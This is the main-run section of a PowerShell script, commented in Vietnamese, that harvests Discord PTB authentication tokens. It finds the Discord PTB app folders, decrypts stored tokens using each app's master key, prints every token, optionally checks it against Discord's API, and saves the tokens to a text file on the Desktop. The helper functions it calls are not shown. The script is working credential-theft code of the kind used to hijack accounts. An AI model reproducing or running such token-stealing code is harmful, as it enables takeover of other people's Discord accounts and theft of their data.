# ============================ CHẠY ============================
$Validate   = $true    # đặt $false nếu không muốn gọi API xác nhận
$OutputPath = Join-Path ([Environment]::GetFolderPath('Desktop')) 'discord_ptb_tokens.txt'

$apps = Get-DiscordAppDirs | Where-Object { $_.Name -match 'ptb' }
$allTokens = [System.Collections.Generic.List[string]]::new()

foreach ($app in $apps) {
    Write-Host "== $($app.Name)  ($($app.AppDir))" -ForegroundColor Cyan
    $key = Get-DiscordMasterKey $app.AppDir
    if (-not $key) { Write-Host '   Không lấy được master key (khác user/máy? Local State thiếu?)'; continue }
    $tokens = Get-DiscordTokens $app.LevelDb $key
    if (-not $tokens) { Write-Host '   Không tìm thấy token.'; continue }
    foreach ($t in $tokens) {
        Write-Host "   TOKEN: $t"
        if ($Validate) { Write-Host ("   " + (Test-DiscordToken $t)) }
        $allTokens.Add($t)
    }
}

# Ghi ra Desktop: chỉ nội dung token, mỗi token 1 dòng
# (1 token -> file có đúng 1 dòng)
if ($allTokens.Count -gt 0) {
    [System.IO.File]::WriteAllLines($OutputPath, $allTokens)
    Write-Host "`nĐã ghi $($allTokens.Count) token vào: $OutputPath" -ForegroundColor Green
} else {
    Write-Host '`nKhông có token nào để ghi.' -ForegroundColor Yellow
}

